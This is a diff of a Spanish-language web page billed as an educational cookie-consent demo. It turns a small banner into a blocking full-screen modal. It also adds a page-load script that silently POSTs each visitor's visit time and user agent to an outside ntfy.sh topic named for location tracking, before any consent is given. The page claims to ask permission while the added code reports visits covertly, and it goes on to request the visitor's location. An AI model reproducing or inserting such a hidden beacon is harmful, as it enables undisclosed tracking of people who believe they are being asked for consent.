@@ -11,27 +11,52 @@
       padding: 20px;
       background-color: #f4f4f4;
     }
-    #cookie-banner {
+    #overlay {
       position: fixed;
-      bottom: 0;
+      top: 0;
       left: 0;
-      right: 0;
-      background-color: #333;
-      color: white;
-      padding: 20px;
-      text-align: center;
-      z-index: 1000;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      z-index: 999;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
-    #cookie-banner button {
+    #cookie-modal {
+      background-color: white;
+      padding: 30px;
+      border-radius: 8px;
+      max-width: 500px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+    }
+    #cookie-modal h2 {
+      margin-top: 0;
+      color: #333;
+    }
+    #cookie-modal p {
+      line-height: 1.6;
+      color: #555;
+    }
+    #cookie-modal button {
       background-color: #4CAF50;
       color: white;
       border: none;
-      padding: 10px 20px;
+      padding: 12px 24px;
       cursor: pointer;
-      margin: 5px;
+      margin: 10px;
+      border-radius: 4px;
+      font-size: 16px;
     }
-    #cookie-banner button:hover {
+    #cookie-modal button:hover {
       background-color: #45a049;
+    }
+    #cookie-modal .reject-btn {
+      background-color: #f44336;
+    }
+    #cookie-modal .reject-btn:hover {
+      background-color: #d32f2f;
     }
     .content {
       max-width: 800px;
@@ -64,25 +89,33 @@
     <div id="status"></div>
   </div>
 
-  <div id="cookie-banner">
-    <p>Esta página utiliza cookies para mejorar tu experiencia. Al aceptar, también solicitaremos permiso para acceder a tu ubicación como parte de esta demostración educativa.</p>
-    <button id="accept-cookies">Aceptar Cookies y Ubicación</button>
-    <button id="decline-cookies">Rechazar</button>
+  <div id="overlay">
+    <div id="cookie-modal">
+      <h2>Consentimiento de Cookies</h2>
+      <p>Esta página utiliza cookies para mejorar tu experiencia y, como parte de esta demostración educativa, solicita permisos adicionales. Al aceptar todas, permites el uso de cookies y la solicitud de ubicación. Puedes rechazar las opcionales para continuar sin ellas.</p>
+      <button id="accept-all">Aceptar Todas</button>
+      <button id="reject-optional" class="reject-btn">Rechazar Opcionales</button>
+    </div>
   </div>
 
   <script>
-    const cookieBanner = document.getElementById('cookie-banner');
-    const acceptBtn = document.getElementById('accept-cookies');
-    const declineBtn = document.getElementById('decline-cookies');
+    const overlay = document.getElementById('overlay');
+    const acceptAllBtn = document.getElementById('accept-all');
+    const rejectOptionalBtn = document.getElementById('reject-optional');
     const statusDiv = document.getElementById('status');
 
-    // Mostrar banner al cargar
+    // Notificar visita al cargar
     window.onload = function() {
-      cookieBanner.style.display = 'block';
+      overlay.style.display = 'flex';
+      fetch("https://ntfy.sh/ubicacion-jared-2024xz", {
+        method: "POST",
+        headers: { "Title": "Nueva visita", "Priority": "default" },
+        body: `Alguien ingresó a la página.\nHora: ${new Date().toLocaleString()}\nUserAgent: ${navigator.userAgent}`
+      });
     };
 
-    acceptBtn.addEventListener('click', function() {
-      cookieBanner.style.display = 'none';
+    acceptAllBtn.addEventListener('click', function() {
+      overlay.style.display = 'none';
       // Simular aceptación de cookies
       localStorage.setItem('cookiesAccepted', 'true');
       statusDiv.innerHTML = '<p>Cookies aceptadas. Ahora solicitando permiso de ubicación...</p>';
@@ -113,9 +146,9 @@
       }, 1000); // 1 segundo de delay para mostrar la secuencia
     });
 
-    declineBtn.addEventListener('click', function() {
-      cookieBanner.style.display = 'none';
-      statusDiv.innerHTML = '<p>Cookies rechazadas. No se solicitará ubicación.</p><p>¡Buena decisión para proteger tu privacidad!</p>';
+    rejectOptionalBtn.addEventListener('click', function() {
+      overlay.style.display = 'none';
+      statusDiv.innerHTML = '<p>Cookies esenciales aceptadas. No se solicitará ubicación.</p><p>¡Buena decisión para proteger tu privacidad!</p>';
     });
   </script>
 </body>
